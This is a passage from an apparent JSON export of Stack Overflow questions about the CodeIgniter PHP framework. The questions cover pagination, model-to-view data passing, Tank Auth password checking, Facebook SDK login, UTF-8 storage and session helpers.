$this-&gt;pagination-&gt;create_links();\n</code></pre>\n"},{"tags":["php","codeigniter","object","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12640849,"title":"How do I pass data from my model to my view as an object and as an array?","body":"<p>I have the following query, which returns a single row.</p>\n\n<p>MODEL:</p>\n\n<pre><code>function get_guide_first(){\n        $this-&gt;db\n            -&gt;select('*')\n            -&gt;from('guides_entries')\n            -&gt;order_by(\"guide_name\", \"asc\")\n            -&gt;limit(1, 0)\n            -&gt;join('guides_content', 'guides_content.guide_id = guides_entries.guide_id'); \n        $query = $this-&gt;db-&gt;get();\n        return $query-&gt;result_array();\n    }\n</code></pre>\n\n<p>Here is my controller:</p>\n\n<p>CONTROLLER:</p>\n\n<pre><code>public function get_first_guide(){\n        $page_data['guide']=$this-&gt;guides_model-&gt;get_guide_first();\n        $this-&gt;load-&gt;view('guidepage', $page_data);\n    }\n</code></pre>\n\n<p>I then run a foreach() loop in my view (or controller sometimes).</p>\n\n<p>VIEW:</p>\n\n<pre><code>foreach($guide as $row){\n    echo $row['guide_content'];\n    $activecat=$row['guide_slug'];\n }\n</code></pre>\n\n<p>Now what I would ideally like to do is return an array back from my model but even using:</p>\n\n<pre><code>return $query-&gt;row();\n</code></pre>\n\n<p>returns an object rather than an array.</p>\n\n<p>1)How can I return this row as a 2d array? \ne.g. so that I could echo a result in the controller as guide['col_name'] rather than guide()->col_name. </p>\n\n<p>2)how would I pass the object to my view so that I could use $guide->col_name from there (I would need to pass this along eith the $page_data array)</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12638383,"title":"Codeigniter - Moving complicated IF statements out of the View","body":"<p>I'm currently working on a project thats means I'm dealing with lots of dates and I have one view where a user can see an overview of various events, for the coming week.</p>\n\n<p>The view shows multiple events for multiple accounts.</p>\n\n<p>The problem I am facing is that my view has some pretty complex IF statements (checking the current date, checking the event date, checking the account id against the event etc) and its starting to look messy and I'm sure it could be done easier/more streamlined!</p>\n\n<p>How would I go about moving an IF statement to the controller?</p>\n\n<p>I tried looking up best practices for CI but nothing useful comes up.</p>\n\n<p>Any insight would be highly appreciated!</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12589298,"title":"codeigniter method showing a uri segment value instead of empty string or null","body":"<p>I have a weird problem.  Hopefully, there's a simple explanation / a simple bug somewhere in my code. </p>\n\n<p>I have methodA in my controller, that needs 3 parameters from the url.  The code looks like this: </p>\n\n<pre><code>      $data['listofpts'] = $this-&gt;sw_model-&gt;get_all_widgets($this-&gt;uri-&gt;segment(3),$this-&gt;uri-&gt;segment(4) );         \n      $data['model'] = $this-&gt;uri-&gt;segment(4);\n      $data['ip'] = $this-&gt;uri-&gt;segment(3); \n      $data['objectid'] = $this-&gt;uri-&gt;segment(5);         \n\n      $data['main_content']='allstats';\n      $this-&gt;load-&gt;view('includes/template', $data); \n</code></pre>\n\n<p>You can see that I'm grabbing 3 pieces of from the url. \nI have 2 additional methods (lets call them methodB and methodC) in the same controller and both of them, when complete, call methodA.  However, when these other methods call methodA, the url looks different.  Specifically, the \"objectid\" variable can be either segment 6 or 7 instead of segment 5. </p>\n\n<p>here's an example of what the URL looks like when methodA is called: </p>\n\n<pre><code>     http://myserver/myapp/mycontroller/methodA/10.14.123.123/H8699A/417\n</code></pre>\n\n<p>Here's an example of what the URL looks like when methodB is called: </p>\n\n<pre><code>    http://myserver/myapp/mycontroller/methodB/10.14.3.44/H8699A/A14/417\n</code></pre>\n\n<p>I'm not sure if this is good design or not, but I decided to change the signature of methodA so that it accepts a number, representing the segment ID. \nSo from methodB, I could do something like: </p>\n\n<pre><code>  $this-&gt;methodA(6);\n</code></pre>\n\n<p>PROBLEM / QUESTION:  There are two things that i don't understand.  The first question is why the new parameter is displaying a value when you just call methodA on its own.  As soon as the ivew \"allstats\" loads, it shows a value inside the new parameter.  Technically, it should be empty.  I've double checked to make sure that only 2 methods call methodA. </p>\n\n<p>Second, I don't understand why when i dump the contents of the parameter, its showing the IP address, which is uri segment 3. </p>\n\n<p>So far, the new code for methodA looks like this: </p>\n\n<pre><code>public function methodA($uriObjectid)\n{\n echo $uriObjectid;\n      $data['listofpts'] =   $this-&gt;switches_model-&gt;get_all_widgets($this-&gt;uri-&gt;segment(3),$this-&gt;uri-&gt;segment(4) );         \n      $data['model'] = $this-&gt;uri-&gt;segment(4);\n      $data['ip'] = $this-&gt;uri-&gt;segment(3); \n      $data['objectid'] = $this-&gt;uri-&gt;segment(5); \n\n\n      $data['main_content']='allstats';\n      $this-&gt;load-&gt;view('includes/template', $data);\n\n}//end methodA\n</code></pre>\n\n<p>Any help would be appreciated. \nThanks. </p>\n\n<p><strong>EDIT 1</strong></p>\n\n<p>This is what my controller looks like: </p>\n\n<p>public MyController extends CI_Controller {</p>\n\n<pre><code>public methodA($optionalparm) \n{\n    //url looks like: http://myserver/myapp/thiscontroller/value1/valueformethodA\n\n   echo $optionalparm;  //this is the variable that's problematic. it should be 3 or 4.\n\n   $valueformethodA = $this-&gt;uri-&gt;segment(2)\n}\n\npublic methodB() {\n    //url looks like: http://myserver/myapp/thiscontroller/value1/value2/value3/valueformethodA\n    //call methodA\n    // $valueformethodA is now uri segment 4.  pass that as argument\n    $this-&gt;methodA(4);\n}\n\npublic methodC() {\n\n    //url looks like: http://myserver/myapp/thiscontroller/value1/value2/valueformethodA\n    //call methodA\n   // $valueformethodA is now uri segment 4.  pass that as argument\n    $this-&gt;methodA(3);\n}\n</code></pre>\n\n<p>}</p>\n"}]}
{"total":13987,"page":14,"pagesize":100,"questions":[{"tags":["codeigniter","tankauth"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":11886892,"title":"Codeigniter tank auth check user entered password","body":"<p>I'm using Tank Auth for my website.</p>\n\n<p>I've searched for a function that would check if user has entered a valid password, when he tries to update his profile.</p>\n\n<p>I don't understand how to hash password from user input that would match one in database.</p>\n\n<p>Here's my controllers code:</p>\n\n<pre><code>            $password = $this-&gt;input-&gt;post('password');\n            $hasher = new PasswordHash(\n                $this-&gt;config-&gt;item('phpass_hash_strength', 'tank_auth'),\n                $this-&gt;config-&gt;item('phpass_hash_portable', 'tank_auth')\n            );\n            $hashed_password = $hasher-&gt;HashPassword($password);\n</code></pre>\n\n<p><code>$hashed_password</code> gives me different hash each time</p>\n\n<p>I dont think that i should enable <code>phpass_hash_portable</code> </p>\n\n<p>Any advices?</p>\n"},{"tags":["php","codeigniter","facebook-php-sdk"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12638543,"title":"facebook OAuthException: An active access token must be used to query information about the current user","body":"<p>Possible duplicate of <a href=\"http://facebook.stackoverflow.com/questions/6034813/facebook-uncaught-oauthexception-an-active-access-token-must-be-used-to-query-i\">facebook Uncaught OAuthException: An active access token must be used to query information about the current user</a></p>\n\n<p>But I did not get a proper solution.</p>\n\n<p>I am using facebook sdk with codeigniter it is working properly. but sometimes it throws exception OAuthException: An active access token must be used to query information about the current user.</p>\n\n<p>Here is the code of Controller file</p>\n\n<pre><code>$config = array(\n                    'appId'  =&gt; 'XXXXXXX',\n                    'secret' =&gt; 'XXXXXXXXXXXXXXXXXXXXXXXXXX',\n                    'fileUpload' =&gt; true,\n              );\n\n$this-&gt;load-&gt;library('facebook/Facebook', $config);\n\n$fbme = null;\n\n$user = $this-&gt;facebook-&gt;getUser();\n\nif ($user) {\n    try {               \n        $fbme = $this-&gt;facebook-&gt;api('/me');\n    } catch (FacebookApiException $e) {\n          error_log($e);\n          $user = null;\n    }\n}\n\n//if user is logged in and session is valid.\nif ($fbme){\n              //do some stuff...\n              //redirecting to user home page (my site's)\n    }\n</code></pre>\n\n<p>In view file, I am using js sdk. Code for view file is</p>\n\n<pre><code>&lt;div id=\"fb-root\"&gt;&lt;/div&gt;\n    &lt;script type=\"text/javascript\"&gt;\n        var button2;\n\n        window.fbAsyncInit = function() {\n            FB.init({ appId: 'XXXXXXXX',\n                status: true,\n                cookie: true,\n                xfbml: true,\n                oauth: true});\n\n           function updateButton(response) {\n                button1 = document.getElementById('fb-login'); //login button\n                button2 = document.getElementById('fb-logout'); //logout button\n                if (response.authResponse) {\n                    //user is already logged in and connected\n                                button2.onclick = function() {\n                                    FB.logout(function(response) {});\n                                };\n            } else {\n                    //user is not connected to your app or logged out\n                    button1.onclick = function() {\n                        FB.login(function(response) {\n                            if (response.authResponse) {\n                            } else {\n                                //user cancelled login or did not grant authorization\n                            }\n                        }, {scope:'email,user_birthday,user_about_me,user_likes,user_interests,user_education_history,user_work_history'});\n                    }\n                }\n            }\n\n            // run once with current status and whenever the status changes\n            FB.getLoginStatus(updateButton);\n            FB.Event.subscribe('auth.login', function(response) {\n                window.location.reload();\n            });\n            FB.Event.subscribe('auth.logout', function(response) {\n                window.location.reload();\n            });\n        };\n        (function() {\n            var e = document.createElement('script'); e.async = true;\n            e.src = document.location.protocol\n                + '//connect.facebook.net/en_US/all.js';\n            document.getElementById('fb-root').appendChild(e);\n        }());       \n    &lt;/script&gt;\n</code></pre>\n\n<p><strong>PROBLEM:</strong></p>\n\n<p>Sometimes the it throws \"OAuthException: An active access token must be used to query information about the current user.\" to the error log file.</p>\n\n<p><strong>Case: user is logged in facebook and has already authenticated my app</strong>\nIf a user is logged in facebook and authenticated my app and tries to logged in to my site,\nrather redirecting the user to my site (php sdk is not working in this case), it is loading the view file. In view file also I am checking whether the user is logged in in facebook or not. (in view) if the user is logged in it will reload the page, same controller script will run and it redirects the user to user's home page(php sdk is working in this case.).</p>\n\n<p>But first time it is not working. Don't know where I am making the mistake.</p>\n\n<p>Also that logout button (in view file) is also sometimes not working. Means on clicking it is not logging out the user from facebook. (It is only happening in one of my colleague's browser. She is using chrome in windows 7)</p>\n"},{"tags":["php","codeigniter","constants"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":11735280,"title":"use config file for constants in codeigniter","body":"<p>I am using cibonfire, \nI have to use some constants in my programs which can be changed later.\nSo what I am doing is I am writing my config file inside <code>application/config/roles.php</code>\nand using that config file in my modules to get that constants, but I am not getting the required result.</p>\n\n<p><strong>SOLVED...</strong></p>\n"},{"tags":["php","facebook","codeigniter","authentication","login"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3873,"score":3,"question_id":8671079,"title":"Facebook getUser() returns 0","body":"<p>I am implementing Facebook login using the PHP SDK with Codeigniter. I get the Facebook login popup, hit login, but I am unable to retrieve the user's id - it always returns 0. </p>\n\n<p>I have put the facebook.php and base_facebook.php files in my libraries file and included it as a library in Codeigniter following a tutorial <a href=\"http://jondavidjohn.com/blog/2011/07/using-the-facebook-api-with-codeigniter\" rel=\"nofollow\">here</a>.</p>\n\n<p>Can anyone tell me what they think is going on? I am using the following code -</p>\n\n<p><strong>View - Facebook login button</strong></p>\n\n<pre><code>  &lt;div id=\"fb-root\"&gt;&lt;/div&gt;\n  &lt;script&gt;\n    window.fbAsyncInit = function() {\n      FB.init({\n        appId      : '&lt;?php echo $this-&gt;config-&gt;item('facebook_app_id'); ?&gt;',\n        status     : true, \n        cookie     : true,\n        xfbml      : true,\n        oauth      : true,\n      });\n\n          FB.Event.subscribe('auth.login', function() {\n            window.location='&lt;?php echo base_url(); ?&gt;auth_other/fb_signin/';\n          });\n\n    };\n    (function(d){\n       var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}\n       js = d.createElement('script'); js.id = id; js.async = true;\n       js.src = \"//connect.facebook.net/en_US/all.js\";\n       d.getElementsByTagName('head')[0].appendChild(js);\n     }(document));\n\n  &lt;/script&gt;\n  &lt;div class=\"fb-login-button\"&gt;Login with Facebook&lt;/div&gt;\n</code></pre>\n\n<p><strong>Controller - auth_other/fb_signin</strong></p>\n\n<pre><code>    function fb_signin()\n    {           \n        $fb_user = null;\n\n        $fb_config = array(\n        'appId'  =&gt; $this-&gt;config-&gt;item('facebook_app_id'),\n        'secret' =&gt; $this-&gt;config-&gt;item('facebook_app_secret')\n        );\n\n        $this-&gt;load-&gt;library('facebook',$fb_config);\n\n        $fb_user = $this-&gt;facebook-&gt;getUser();\n\n\n        echo $fb_user;\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","encoding","turkish"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":826,"score":2,"question_id":6084586,"title":"Php code igniter save turkish characters to my sql","body":"<p>I am writing a web app using PHP Codeigniter. I receive input that can be in any language and I save it in my DB. </p>\n\n<p>The MYSQL DB collation is set to utf8_unicode_ci. \nFor codeigniter in the database.php I have set this:</p>\n\n<pre><code>$db['default']['char_set'] = 'utf8';\n$db['default']['dbcollat'] = 'utf8_unicode_ci';\n</code></pre>\n\n<p>When I run the following insert on my DB:</p>\n\n<pre><code>insert into user (name,id) values ('John Temirtaş', 2)\n</code></pre>\n\n<p>I get this error:</p>\n\n<blockquote>\n  <p>Incorrect string value: '\\xC5\\x9F' for column 'name' at row 1</p>\n</blockquote>\n\n<p>There is a problem with the s. Its a turkish character. </p>\n\n<p>So far I have tried this while debugging</p>\n\n<pre><code>print_r($name)\nJohn Temirtaş\n\nprint_r(\"Encoded Name: \".utf8_encode($name))\nEncoded Name: John TemirtaÅ\n\nprint_r(\"Decoded Name\".utf8_decode($name)\nEncoded Name: John Temirta?\n\nprint_r(\"Decoded-Encode Name: \".utf8_decode(utf8_encode($name)))\nDecoded-Encode Name: John Temirtaş\n</code></pre>\n\n<p>I have tried saving John TemirtaÅ in the db and it works fine. So I think I might <code>utf8_encode($name)</code> before saving it in the DB and utf8_decode before displaying it. Just doing the latter will NOT work. YOU NEED TO ADD <code>mb_internal_encoding(\"UTF-8\");</code> to the top of your php script.</p>\n\n<p>How do I encode the data properly so that its inserted?</p>\n\n<hr>\n\n<p><strong>THANK YOU EVERYONE FOR YOU HELP HERE IS WHAT WORKED!</strong></p>\n\n<ol>\n<li>Open up MySql work bench. Set the\ncharacter encoding and collation of\nthe user table. Charset: utf-8\nCollation: utf8_unicode_ci </li>\n<li>Set the collation of the <strong>name</strong> column\nto <strong>utf8_unicode_ci</strong>. Done. The\ninsert should work.</li>\n</ol>\n\n<p>Thank you for all your help.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12635438,"title":"pass variable from codeigniter view to the external core php page","body":"<p>How can i pass variable from codeigniter view to the external core php page which is included in that view ? </p>\n\n<p>For example,\n codeigniter view name is \"login\" and i have included a external php file name \"logininner.php\" and i want to pass a variable from \"login\" to \"logininner.php\". </p>\n\n<p>can any one tell me a way to do this?  </p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":143,"score":2,"question_id":12446834,"title":"Setting cookies not working in CodeIgniter","body":"<p>I wnat to set cookie with a name <strong>csrf_cookie_name</strong> with a value from this function <strong>$this->security->get_csrf_hash();</strong> but, it is not working.</p>\n\n<p>I have this in my controller:</p>\n\n<pre><code>   $csrf_cookie_value = $this-&gt;security-&gt;get_csrf_hash();\n   $this-&gt;input-&gt;set_cookie('csrf_cookie_name', $csrf_cookie_value);\n   echo $this-&gt;input-&gt;cookie('csrf_cookie_name'); \n   die();\n</code></pre>\n\n<p>But it is not working and nothing is echoed out.</p>\n\n<p>If I try only this:</p>\n\n<pre><code> $csrf_cookie_value =  $this-&gt;security-&gt;get_csrf_hash();\n echo $csrf_cookie_value;\n</code></pre>\n\n<p>I works and a generated string is echoed out.</p>\n\n<p>So, I assume that something within these next 2 lines is wrong:</p>\n\n<pre><code>$this-&gt;input-&gt;set_cookie('csrf_cookie_name', $csrf_cookie_value);\necho $this-&gt;input-&gt;cookie('csrf_cookie_name'); \n</code></pre>\n\n<p>Thanks for your advice.</p>\n"},{"tags":["php","validation","codeigniter","view"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12618745,"title":"Codeigniter: Load View file with #id added on to url to scroll down page","body":"<p>I am using the form validation class in codeigniter. All working fine but when it reloads the form with the errors the page is at the top again. (because it's refreshed). Is there a way I can add an <code>#id</code> onto the end of the url so it will load further down the page where the form is?</p>\n\n<p>I tried <code>redirect('form/form#form, 'refresh')</code> which worked but didnt carry through the errors.</p>\n"},{"tags":["php","css","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":154,"score":4,"question_id":12633419,"title":"How to insert <ul> in foreach loop every 10 records","body":"<pre><code>&lt;?php foreach($products as $product) : ?&gt;\n\n&lt;li&gt;&lt;a href=\"&lt;?php echo base_url(); ?&gt;main/products/&lt;?php echo $product-&gt;id; ?&gt;\"&gt;\n&lt;?php echo $product-&gt;name; ?&gt; &lt;/a&gt;&lt;/li&gt;\n\n&lt;?php endforeach; ?&gt;\n</code></pre>\n\n<p>So the code above get's all records in a <code>DB</code> and generates links. 100 Records in the table - I want to split the design into 5 col. So I will do that in <code>CSS</code> but I need to be able to enclose </p>\n\n<pre><code>&lt;ul&gt; on every 20 records&lt;/ul&gt;\n</code></pre>\n\n<p>How can i <code>count</code> the loop and do this?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12633182,"title":"Codeigniter MVC / Display all records in table","body":"<p>The following code I wrote is only displaying the last row in the table. However I need to <code>loop</code> and display each <code>row</code> in the table. </p>\n\n<h1>MODEL</h1>\n\n<pre><code>class Catalog_products extends CI_Model {\n\n    function Show_all_products()\n    {\n\n        $q = $this-&gt;db-&gt;get('printer');\n\n        foreach ($q-&gt;result() as $row)\n            {\n                $data = array();\n                $data['id'] = $row-&gt;id;\n                $data['name'] = $row-&gt;name; \n            }   \n\n        return $data;\n\n    }\n\n}\n</code></pre>\n\n<h1>VIEW</h1>\n\n<pre><code>&lt;?php echo $id ?&gt;\n&lt;?php echo $name ?&gt;\n</code></pre>\n\n<h1>CONTROLLER</h1>\n\n<pre><code>public function catalog()\n{\n\n    $this-&gt;load-&gt;model('Catalog_products');\n    $data = $this-&gt;Catalog_products-&gt;Show_all_products();\n    $this-&gt;load-&gt;view('catalog', $data);\n}\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-2","php-frameworks"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":473,"score":1,"question_id":10952530,"title":"CodeIgniter - dynamic pages - default controller url","body":"<p><strong>edit</strong></p>\n\n<p>my solution in routes.php:</p>\n\n<pre><code>$route['news'] = 'news_controller';\n$route['gallery'] = 'gallery_controller';\n$route['(:any)'] = 'sites/$1';\n</code></pre>\n\n<p>and in my site conroller:</p>\n\n<pre><code>function index($site_id = '') {\n  //sanitize $site_id.\n  $this-&gt;site = $this-&gt;sites_model-&gt;get_site($site_id);\n  //etc.\n}\n</code></pre>\n\n<p>THX to YAN</p>\n\n<p><strong>question:</strong></p>\n\n<p>so i wrote a little CMS with CodeIgniter. The admin can create sites. the site opens automatically when the segment of the url is like one in the DB. eg mysite.com/sites/about will call the \"About\" site. this works fine.</p>\n\n<p>now i got a problem with my URL. i want this url</p>\n\n<p><a href=\"http://www.mysite.com/sites/about\" rel=\"nofollow\">http://www.mysite.com/sites/about</a></p>\n\n<p>turns to this:</p>\n\n<p><a href=\"http://www.mysite.com/about\" rel=\"nofollow\">http://www.mysite.com/about</a></p>\n\n<p>the problem is, that i cannot use the routes.php and set wildcards for each site. (because they are dynamic and i dont know wich site the customer will create - and i dont want to edit the routes.php file for each site he will create - this should be done automatically)</p>\n\n<p>the problem is i got other fix controllers too, like news, gallery or contact:\nmysite.com/news, mysite.com/gallery, ...they work fine</p>\n\n<p>so here is my Site Controller:</p>\n\n<pre><code>class Sites extends Public_Controller {\n\npublic $site;\npublic $url_segment;\n\npublic function _remap($method)\n{\n    $this-&gt;url_segment = $this-&gt;uri-&gt;segment(2);\n\n    $this-&gt;load-&gt;model('sites_model');\n    $this-&gt;site = $this-&gt;sites_model-&gt;get_site($this-&gt;url_segment);\n\n    if($this-&gt;site !== FALSE)\n    {\n        $this-&gt;show_site($this-&gt;site);\n    }\n    else\n    {\n        show_404($this-&gt;url_segment);\n    }\n}\n\npublic function show_site($data)\n{\n    $this-&gt;template-&gt;set('site', FALSE);\n    $this-&gt;template-&gt;set('site_title', $data['name']);\n    $this-&gt;template-&gt;set('content',$data['content']);\n    $this-&gt;template-&gt;load('public/template','sites/sites_view', $data);\n}}\n</code></pre>\n\n<p>and this is the Site_model who checks the database...if the url_segment fits the title in the DB:</p>\n\n<pre><code>class Sites_model extends CI_Model {\n\npublic function get_site($site_url)\n{\n    if($site_url != \"\"){\n        $this-&gt;db-&gt;where('name', $site_url);\n        $query = $this-&gt;db-&gt;get('sites', 1);\n\n        if($query-&gt;num_rows() &gt; 0){\n            return $query-&gt;row_array();\n        }\n        else\n        {\n            return FALSE;\n        }\n    }else{\n        return FALSE;\n    }\n} }\n</code></pre>\n\n<p>i think i need something who checks if the controller exists (the first segment of the url) when not call the Site controller and check if the site is in the DB and when this is false then call 404.</p>\n\n<p>any suggestions how this can be solved?</p>\n\n<p>btw: sry for my english</p>\n\n<p>regards GN</p>\n"},{"tags":["php","oop","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12631726,"title":"How do I make this code reusable on different views? Proper method","body":"<p>I am somewhat confused on the proper way to perform the following. Is this a class a function or an object? (Not sure) So here goes (please be kind) I'm learning codeigniter/php simultaneously.  </p>\n\n<pre><code>    $is_live = $this-&gt;session-&gt;userdata('email');\n    $is_live = ucwords($is_live);\n            if (!$is_live == null)\n                   echo 'Hello, '.$is_live.\n                   ' &lt;b&gt;(Not you? '.'&lt;a href=\"' .base_url().\n                   'main/logout\"&gt;Log Out&lt;/a&gt;) &lt;/b&gt;'; \n</code></pre>\n\n<p>I wrote this code, which checks if a session is set and if true echo the details. I currently have this code on my <code>view/main</code> However I want to have this code displayed on all pages.</p>\n\n<p>What is the proper way to do this?</p>\n\n<ol>\n<li>Do i create a <code>view/header</code> which is auto loaded on each page and insert this <code>code</code> there?</li>\n<li>Do I create a <code>class/public function</code> in a <code>helper</code> file and load it where needed?</li>\n<li>Do I create a <code>class/public function</code> in a <code>library</code> file and load it where needed?</li>\n<li>Do I create a <code>public function</code> in a controller?</li>\n</ol>\n\n<p>-EXTRA-\nMy assumption is option <code>1</code> but I'm curious what if I want to display this information in another location on a particular page? I don't want to have to copy/paste the code block because that is sloppy.</p>\n\n<p>How would I set it up so that I can just call it where i need it? \ne.g. <code>$this-&gt;load-&gt;helper('check_for_sess');</code></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass isLive\n{   \n    public function is_live() {\n\n        $is_live = $this-&gt;session-&gt;userdata('email');\n        $is_live = ucwords($is_live);\n             if (!$is_live == null)\n               echo 'Hello, '.$is_live.\n               ' &lt;b&gt;(Not you? '.'&lt;a href=\"' .base_url().'main/logout\"&gt;Log Out&lt;/a&gt;) &lt;/b&gt;'; \n\n    }\n}\n</code></pre>\n\n<p>On the <code>view</code> I tried this: </p>\n\n<pre><code>&lt;?php \n    $isLive = new isLive;\n    $isLive-&gt;is_live(); \n?&gt;\n</code></pre>\n\n<p>This however doesn't work and causes a ' function userdata() on a non-object error '</p>\n\n<p>Can someone please explain the proper way to achieve my desired solution and the correct syntax. Thanks in advance! </p>\n\n<p>-UPDATE-- Tried to create a library - still getting error.</p>\n\n<pre><code>#Created a library \nclass CheckSess \n{   \n    function IsLive() \n    {   \n    $is_live = $this-&gt;session-&gt;userdata('email');\n    $is_live = ucwords($is_live);\n\n            if (!$is_live == null) \n            {\n               $check_msg = 'Hello, '.$is_live.\n               ' &lt;b&gt;(Not you? '.'&lt;a href=\"' .base_url().'main/logout\"&gt;Log Out&lt;/a&gt;) &lt;/b&gt;';\n            }\n\n    return $check_msg;\n    }\n\n}\n\n\n#In the View\n&lt;?php echo $this-&gt;CheckSess-&gt;IsLive();  ?&gt;\n\n#in the controller\n$this-&gt;load-&gt;library('CheckSess');\n</code></pre>\n\n<p>--UPDATE--</p>\n\n<pre><code>class CheckSess {\n\n    function IsLive() \n    {   \n    $CI =&amp; get_instance();\n    $is_live = $CI-&gt;session-&gt;userdata('email');\n    $is_live = ucwords($is_live);\n\n            if (!$is_live == null) \n            {\n               return 'Hello, '.$is_live.\n               ' &lt;b&gt;(Not you? '.'&lt;a href=\"' .base_url().'main/logout\"&gt;Log Out&lt;/a&gt;) &lt;/b&gt;';\n            }\n\n    }\n\n}\n</code></pre>\n\n<p>Set this^ is the <code>libraries</code> folder</p>\n\n<p>the <code>view</code> shows <code>&lt;?php echo $this-&gt;CheckSess-&gt;IsLive(); ?&gt;</code></p>\n\n<p>and the <code>controller</code> shows <code>$this-&gt;load-&gt;library('CheckSess');</code></p>\n\n<p>please advise. Thanks again!</p>\n\n<p>ERROR---</p>\n\n<p>( ! ) SCREAM: Error suppression ignored for\n( ! ) Fatal error: Call to a member function IsLive() on a non-object in C:\\wampserver\\www\\test-app\\application\\views\\homepage.php on line 56\nCall Stack</p>\n\n<h1>Time    Memory  Function    Location</h1>\n\n<p>1   0.0005  151432  {main}( )   ..\\index.php:0\n2   0.0014  187792  require_once( 'C:\\wampserver\\www\\test-app\\system\\core\\CodeIgniter.php' )    ..\\index.php:202\n3   0.0277  1537000 call_user_func_array ( )    ..\\CodeIgniter.php:359\n4   0.0277  1537048 Main->index( )  ..\\CodeIgniter.php:359\n5   0.0283  1540200 CI_Loader->view( )  ..\\main.php:8\n6   0.0283  1540640 CI_Loader->_ci_load( )  ..\\Loader.php:419\n7   0.0287  1566584 include( 'C:\\wampserver\\www\\test-app\\application\\views\\homepage.php' )  ..\\Loader.php:833</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12631555,"title":"Codeigniter - Object of class __PHP_Incomplete_Class could not be converted to string","body":"<p>I'm getting a <strong>Object of class __PHP_Incomplete_Class could not be converted to string</strong> error when I echo my <strong>is_active</strong> variable, I can work just fine with the username and is_logged_in variable, but not with the is_active variable, I'm wondering what I could be doing wrong here...</p>\n\n<p>On my controller I did:</p>\n\n<pre><code>$username=$this-&gt;input-&gt;post(\"username\");\n            $activated_val=$this-&gt;membership_model-&gt;is_activated($username);\n\n            $data = array(\n                \"username\" =&gt; $this-&gt;input-&gt;post(\"username\"),\n                \"is_logged_in\" =&gt; true,\n                \"is_active\" =&gt; $activated_val\n            );\n            $this-&gt;session-&gt;set_userdata($data);\n            redirect(\"main\");\n</code></pre>\n\n<p>My model function:</p>\n\n<pre><code>function is_activated($username){\n        $query = \"SELECT activated FROM members WHERE username=?\";\n        $result = $this-&gt;db-&gt;query($query, $username);\n\n        return $result;\n    }\n</code></pre>\n\n<p>And in my view:</p>\n\n<pre><code>$is_active= $this-&gt;session-&gt;userdata(\"is_active\");\n                echo $is_active;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12602320,"title":"CodeIgniter shows unexpected errors","body":"<p>I'm using CodeIgniter v1.0 to work on my PHP application. Yesterday, running it on localhost, things were okay, but today there are many errors showing up in CI's logs. Here are some examples:</p>\n\n<pre><code>Severity: Notice\nMessage: Trying to get property of non-object\nFilename: helpers/functions_helper.php\nLine Number: 515\n</code></pre>\n\n<hr>\n\n<pre><code>Severity: Warning\nMessage: implode(): Invalid arguments passed\nFilename: controllers/reports.php\nLine Number: 102\n</code></pre>\n\n<hr>\n\n<pre><code>Severity: Notice\nMessage: Undefined variable: carray\nFilename: controllers/reports.php\nLine Number: 103\n</code></pre>\n\n<hr>\n\n<p>What might be causing these errors to appear?</p>\n"},{"tags":["php","codeigniter","codeigniter-2","ion-auth"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12626292,"title":"Can I set Ion auth to login by username OR Email","body":"<p>I know I can set ion auth to login by username in the config, I also know I can set it to login by email in the config. </p>\n\n<p>Is there a simple way to set it it to use either automatically?</p>\n"},{"tags":["php","html","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12629052,"title":"How can i get path url from a local path in codeigniter","body":"<p>I have a problem  in creating a download link in codeigniter.\nMy problem is i ahve a local path for my file name:</p>\n\n<pre><code>C:\\wamp\\www\\elance\\zip2\\uploads/13487727859183.zip\n</code></pre>\n\n<p>Now to make the download link i need something like <code>http://localhost/elance/zip2/uploads/13487727859183.zip</code></p>\n\n<p>I am confused and not getting a solution how to do it.</p>\n"},{"tags":["php","codeigniter","mx"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":743,"score":1,"question_id":5994783,"title":"Codeigniter HMVC Re-Declare error coming","body":"<p>I am using CI 2.0.2 and using 5.4 Modular extension..</p>\n\n<p>I have user as a default controller.</p>\n\n<pre><code>class User extends CI_Controller{\n\n public function __construct(){\n   parent::__construct();\n } \n\n public function login{ echo modules::run('login/main'); }\n}\n</code></pre>\n\n<p>Here is my modules/login/controller</p>\n\n<pre><code>class Login extends MX_Controller{\n\n  public function __construct(){\n    parent::__construct();\n\n  